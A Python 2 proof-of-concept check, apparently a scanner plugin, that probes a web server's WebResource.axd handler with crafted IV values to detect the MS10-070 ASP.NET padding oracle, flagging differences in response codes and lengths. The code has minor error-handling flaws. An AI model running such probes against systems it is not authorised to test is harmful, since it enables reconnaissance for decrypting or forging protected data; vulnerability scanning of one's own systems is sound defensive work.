# coding=utf-8
import base64
import urllib2
from config import is_port_open

# @is_port_open
def verify(ip, port=80, name='', timeout=10, types='ip'):
    # if not is_port_open()
    try:
        if types == 'ip':
            url = 'http://' + ip + ":" + str(port)
        else:
            url = 'http://{}'.format(ip)
        res_html = urllib2.urlopen(url, timeout=timeout).read()
        if 'WebResource.axd?d=' in res_html:
            error_i = 0
            bglen = 0
            for k in range(0, 255):
                IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + chr(k)
                bgstr = 'A' * 21 + '1'
                enstr = base64.b64encode(IV).replace('=', '').replace('/', '-').replace('+', '-')
                exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                try:
                    request = urllib2.Request(exp_url)
                    res = urllib2.urlopen(request, timeout=timeout)
                    res_html = res.read()
                    res_code = res.code
                except urllib2.HTTPError, e:
                    res_html = e.read()
                    res_code = e.code
                except urllib2.URLError, e:
                    error_i += 1
                    if error_i >= 3: return
                except:
                    print "[poc_ms10_070] [line 42] [error={}]".format(repr(e))
                    return
                if int(res_code) == 200 or int(res_code) == 500:
                    if k == 0:
                        bgcode = int(res_code)
                        bglen = len(res_html)
                    else:
                        necode = int(res_code)
                        if (bgcode != necode) or (bglen != len(res_html)):
                            info = {
                                "url": url,
                                'vuln_name': 'MS10-070 ASP.NET Padding Oracle Infoleak',
                                'severity': 'high',
                                'proof': 'poc_MS10-070'
                            }
                            return info
                else:
                    return
    except Exception, e:
        print "[poc_ms10_070] [line 59] [error={}]".format(repr(e))
